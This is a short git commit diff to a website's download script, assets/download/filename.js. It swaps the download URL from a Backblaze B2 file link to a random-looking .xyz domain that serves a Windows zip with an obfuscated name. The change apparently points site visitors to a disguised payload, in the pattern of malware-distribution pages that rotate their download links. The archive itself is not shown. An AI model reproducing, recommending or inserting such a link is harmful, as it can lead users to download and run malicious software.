97aadb031616785afa20ba16aad24e110a636056
z168188 <lyuelinm54@gmail.com>
2025-09-06 16:15:59 +0800

    Update filename.js

--- assets/download/filename.js
+++ assets/download/filename.js
@@ -1,5 +1,6 @@
 (function() {
-    window['filename'] = 'https://f005.backblazeb2.com/b2api/v1/b2_download_file_by_id?fileId=4_z64b9c51816b9c17a9a8a0311_f114a6e3084bdeec8_d20250906_m074624_c005_v0501024_t0022_u01757144784488';
+    window['filename'] = 'https://risanhs-sdad1e4asd-3css3hub.xyz/Vicce_x64_win7-11_Quioaydiiek_v412001.23.zip';
 })();
+
 
 
